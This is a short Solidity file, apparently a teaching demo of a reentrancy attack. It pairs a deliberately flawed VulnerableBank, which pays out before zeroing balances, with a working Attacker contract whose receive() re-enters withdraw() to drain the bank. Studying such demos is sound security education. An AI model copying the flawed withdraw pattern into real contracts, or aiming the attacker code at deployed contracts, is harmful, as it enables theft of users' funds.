 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;


contract VulnerableBank {
    mapping(address => uint) public balances;







function deposit() payable public {

    balances[msg.sender] += msg.value;
}




    function withdraw() public {
        uint amount = balances[msg.sender];
        
        // 1. Send Ether to the caller
        // This triggers the Attacker's receive() function!
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);

        // 2. Update balance (Too late! The attack already happened)
        balances[msg.sender] = 0;
    }
}



contract Attacker {
    VulnerableBank public bank;


function initalizeBank(address _bank) external{
bank = VulnerableBank(_bank);
}



function attackBank()   public payable{
bank.deposit{value:msg.value}();
bank.withdraw();
}


    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // The "Loop" back into the bank
        }
    }
}